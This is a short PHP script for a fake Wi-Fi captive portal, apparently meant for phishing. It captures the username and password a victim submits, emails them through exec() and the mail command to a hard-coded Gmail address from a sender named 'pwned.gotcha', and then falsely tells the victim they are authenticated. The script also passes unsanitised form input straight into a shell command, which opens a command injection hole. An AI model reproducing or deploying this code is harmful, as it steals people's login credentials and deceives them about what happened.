<?php 
if(isset($_POST['submit'])){
    $to = "amlidoscg@gmail.com"; // this is your Email address
    $from = "CaptivePortal@pwned.gotcha"; // this is the sender's Email address
    $username = $_POST['username'];
    $password = $_POST['password'];
    $subject = "Captive Portal Log";
    $message = "Username: " . $username . " Password: " . $password . "\n\n";

	$cmd = "echo \"$message\" | mail -s \"$subject\" -a \"From: $from\" $to";
	exec($cmd, $out, $status);

	if ($status === 0) { echo ""; }
	else { echo "Something went wrong. Please try again."; }

    echo "Thank you " . $username . ", you are now authenticated.";
    // You can also use header('Location: thank_you.php'); to redirect to another page.
    // You cannot use header and echo together. It's one or the other.
    }
?>